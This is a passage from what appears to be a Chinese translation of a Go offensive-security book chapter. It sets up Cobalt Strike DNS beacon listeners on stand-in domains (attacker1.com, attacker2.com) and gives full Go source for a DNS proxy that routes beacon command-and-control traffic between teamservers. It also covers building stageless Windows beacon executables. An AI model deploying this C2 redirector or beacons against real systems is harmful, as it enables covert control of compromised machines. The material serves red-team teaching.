从 Cobalt Strike 客户端，通过选择 **Cobalt Strike -> **New Connection** 创建新的连接，将端口修改为 50052，选中 **Connect** 。连接后，您应该会在控制台底部看到两个切换服务的选项卡。

现在成功地连接到两个 teamserver 了。启动两个DNS监听。从菜单中选择 **Configure Listeners** 来创建客户端，其图标看起来像一副耳机。完成后，从底部菜单中选择 **Add** 以打开 New Listener 窗口。输入下面的信息：

- Name:**DNS 1**
- Payload: **windows/beacon_dns/reverse_dns_txt**
- Host: ****
- Port: **0**

本例中，端口设置为80，但是DNS的负载仍然使用53端口，所以不要担心。80端口专门用于混合有效负载。图5-2是New Listener 窗口和应该输入的信息。

<div align=center><img width = '924' height ='518' src ="https://github.com/YYRise/black-hat-go/raw/dev/ch-5/images/5-2.jpg"/></div>
<center> 图 5-2: 添加监听 </center>

接下来，将提示您输入用于指引的域，如图5-3所示。

输入域 *attacker1.com*  作为DNS指引，它应该是您的负载指引所指向的域名。应该会看到一条消息，指示新侦听已经启动。在另一个 teamserver 重复此步骤，使用 DNS 2 和 *attacker2.com * 。在开始使用这两个监听前，需要编写一个中间服务器来检查DNS消息并适当地路由它们。本质上，这就是代理。

<div align=center><img width = '924' height ='532' src ="https://github.com/YYRise/black-hat-go/raw/dev/ch-5/images/5-3.jpg"/></div>
<center> 图 5-3: 添加DNS的指引域 </center>

#### 创建DNS代理

本章一直使用的DNS包使编写中间函数变得很容易，并且在之前的部分中也已经使用了几个函数。代理需要能做到下面几点：

- 创建处理函数来获取输入的查询
- 检查查询的问题并提取域名Inspect the question in the query and extract the domain name
- 识别与域名相关的上游DNS服务器
- 与上游DNS服务器交换问题，并将响应写入客户端

可以编写处理程序函数来将attacker1.com和attacker2.com作为静态值处理，但这是不可维护的。相反，应该从程序外的资源中查找记录，例如数据库和配置文件。下面的代码通过使用 domain,server 的格式来实现，该格式列出了用逗号分隔的传入域和上游服务器。启动程序，创建函数来解析这种格式的文件。将清单5-6的代码保存到新文件 *main.go* 中。

```go
package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func parse(filename string) (map[string]string, error) {
	records := make(map[string]string)
	fh, err := os.Open(filename)
	if err != nil {
		return records, err
	}
	defer fh.Close()
	scanner := bufio.NewScanner(fh)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, ",", 2)
		if len(parts) < 2 {
			return records, fmt.Errorf("%s is not a valid line", line)
		}
		records[parts[0]] = parts[1]
	}
	return records, scanner.Err()
}

func main() {
	records, err := parse("proxy.config")
	if err != nil {
		log.Fatalf("Error processing configuration file: %s\n", err.Error())
	}
    fmt.Printf("%+v\n", records)
}

```

清单 5-6: DNS 代理 (https://github.com/blackhat-go/bhg/ch-5/dns_proxy/main.go/)

这段代码中，首先定义一个函数，该函数解析包含配置信息的文件并返回一个map[string]string。使用map来查找输入的域和检索上游服务器。

在终端窗口中输入下面代码的第一个命令，该命令将echo后的字符串写入到*proxy.config*文件中。接下来，编译并执行*dns_proxy.go。*

```shell
$ echo 'attacker1.com,127.0.0.1:2020\nattacker2.com,127.0.0.1:2021' > proxy.config 
$ go build
$ ./dns_proxy
map[attacker1.com:127.0.0.1:2020 attacker2.com:127.0.0.1:2021]
```

看看输出了什么？是 teamserver 域名和 Cobalt Strike DNS 监听的端口组成的map。回想下将端口2020 和 2021分别映射到两个Docker容器中53端口。这是创建基本配置的一种快速而粗糙的方式，因为不必将其存储在数据库或其他持久存储机制中。

使用定义的记录map，就可以编写处理函数了。来优化下代码，将下面代码添加到 main() 函数中。应该遵循配置文件的解析。

```go
dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
		if len(req.Question) < 1 {
			dns.HandleFailed(w, req)
			return
		}
		name := req.Question[0].Name
		parts := strings.Split(name, ".")
		if len(parts) > 1 {
			name = strings.Join(parts[len(parts)-2:], ".")
		}
		recordLock.RLock()
		match, ok := records[name]
		recordLock.RUnlock()
		if !ok {
			dns.HandleFailed(w, req)
			return
		}
		resp, err := dns.Exchange(req, match)
		if err != nil {
			dns.HandleFailed(w, req)
			return
		}
		if err := w.WriteMsg(resp); err != nil {
			dns.HandleFailed(w, req)
			return
		}
	})
```

首先，使用一个点号调用HandleFunc()来处理所有传入的请求，然后定义 *anonymous function* ，该函数不能复用（也没有名字）。当不打算重用代码块时，这是一种很好的设计。如果打算重用的话，应该声明它并将其作为 *named function*调用。接下来，检查输入的问题切片确保至少有一个值，如果不是的话，调用 `HandleFailed()` 及早地退出函数。这是整个处理程序中使用的模式。如果至少存在有一问题，可以安全地从第一个问题中取出查询的名字。必须用逗号分隔名字来提取域名。分隔名字返回的结果值应该永远不会不大于1，安全起见最后检查下。使用切片中 *slice* 操作可以抓取切片的 *tail* ——切片中最后一个元素。现在需要从记录map中检索上游服务器。

从map中检索值能返回一个或两个变量。如果key（本例中是域名）存在map中的话会返回相应的值。如果不存在就返回空字符串。可以通过返回的值是否是空字符串判断，但是在处理复杂类型时这样是低效的。相反，使用两个变量：第一个是和key相应的值，第二个是Boolean值，如果存在返回true。在确保匹配之后，可以与上游服务器交换请求。只是确保在持久存储中配置了接收到的请求的域名。接下来，将来自上游服务器的响应写回客户端。定义处理函数后就可以起到服务了。最后，编译并启动代理。

代理运行后就可以是使用两个 Cobalt Strike 监听来测试了。为此，首先创建两个无阶段的可执行文件。从 Cobalt Strike 的顶部菜单中，点击像齿轮的按钮，然后将输出更改为 **Windows Exe** 。在另一个 teamserver 重复此过程。将这些可执行文件复制到Windows VM并执行它们。Windows VM的DNS服务器应该是Linux主机的IP地址。否则的话不能测试。这可能需要一两个小时，但最终您应该会在每个teamserver上看到一个新的信标。任务完成!

#### 收尾工作

这已经很帮了，但是当必须更改 teamserver IP地址或重定向时，或者如果必须添加一条记录，都需要重启服务。信标可能会在这样的行动中幸存下来，但是当有更好的选择时，为什么还要去冒险呢？可以使用进程信号告诉运行中的程序重新加载配置文件。清单5-7是带有进程信号逻辑的完整程序：

```go
package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"

	"github.com/miekg/dns"
)

func parse(filename string) (map[string]string, error) {
	records := make(map[string]string)
	fh, err := os.Open(filename)
	if err != nil {
		return records, err
	}
	defer fh.Close()
	scanner := bufio.NewScanner(fh)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, ",", 2)
		if len(parts) < 2 {
			return records, fmt.Errorf("%s is not a valid line", line)
		}
		records[parts[0]] = parts[1]
	}
	log.Println("records set to:")
	for k, v := range records {
		fmt.Printf("%s -> %s\n", k, v)
	}
	return records, scanner.Err()
}

func main() {
	var recordLock sync.RWMutex

	records, err := parse("proxy.config")
	if err != nil {
		log.Fatalf("Error processing configuration file: %s\n", err.Error())
	}

	dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
		if len(req.Question) < 1 {
			dns.HandleFailed(w, req)
			return
		}
		name := req.Question[0].Name
		parts := strings.Split(name, ".")
		if len(parts) > 1 {
			name = strings.Join(parts[len(parts)-2:], ".")
		}
		recordLock.RLock()
		match, ok := records[name]
		recordLock.RUnlock()
		if !ok {
			dns.HandleFailed(w, req)
			return
		}
		resp, err := dns.Exchange(req, match)
		if err != nil {
			dns.HandleFailed(w, req)
			return
		}
		if err := w.WriteMsg(resp); err != nil {
			dns.HandleFailed(w, req)
			return
		}
	})

	go func() {
		sigs := make(chan os.Signal, 1)
		signal.Notify(sigs, syscall.SIGUSR1)

		for sig := range sigs {
			switch sig {
			case syscall.SIGUSR1:
				log.Println("SIGUSR1: reloading records")
				recordLock.Lock()
				recordsUpdate, err := parse("proxy.config")
				if err != nil {
					log.Printf("Error processing configuration file: %s\n", err.Error())
				} else {
					records = recordsUpdate
				}
				recordLock.Unlock()
			}
		}
	}()

	log.Fatal(dns.ListenAndServe(":53", "udp", nil))
}
```

清单 5-7: 完整的代理 (https://github.com/blackhat-go/bhg/ch-5/dns_proxy/main.go/)

有一些补充。因为程序将修改一个可能被并发 goroutine 使用的map，要使用互斥锁来控制访问。*mutex*防止敏感代码块的并发执行，它允许任何 goroutine 读取数据而不会将其他的锁在外面，当写时会把其他的 goroutine 锁在外面。或者，在资源上实现没有互斥的goroutine会引入交叉，这可能导致竞争条件或更糟的情况。

在处理函数中访问map前，先调用 RLock 来读取匹配的值；读取完成后再调用 RUnlock 来为下一个goroutine释放 map。在运行 goroutine 的匿名函数中，先处理监听的信号。使用 os.Signal 类型的管道来完成，在调用 signal.Notify() 时提供，以及预留的 SIGUSR1管道使用的文字信号。在遍历信号的循环中，使用 switch 语句来表明收到的信号类型。可以只配置监控单个的信号，但是在不久后就会更改，因此这是个恰当的设计模式。最后，在重新加载运行的配置前使用 Lock() 来阻塞读取记录 map 的 goroutine。使用 Unlock() 来继续执行。

通过启动代理和在已存在的 teamserver中创建新的监听来测试程序。使用域名 *attacker3.com* 。代理运行后，在  *proxy.config* 文件中添加监听的域名。发送 kill 信号给进程来重新加载配置，但是要先使用ps 和 grep 来找出进程的 ID。

```shell
$ ps -ef | grep proxy 
$ kill -10 PID
```

代理应该会重新加载。通过创建和执行一个新的无阶段的可执行文件来测试。代理现在应该具备了功能，并且可以生产了。

## 总结

尽管这一章已经结束了，但是代码仍然有无限的可能性。例如，Cobalt Strike可以以混合方式操作，使用HTTP和DNS进行不同的操作。要做到这一点，必须修改代理来响应侦听者IP的 A 记录；还需要将其他端口转发到容器中。在下一章中，将深入研究 SMB 和 NTLM 中令人费解的疯狂之处。现在，去征服吧!

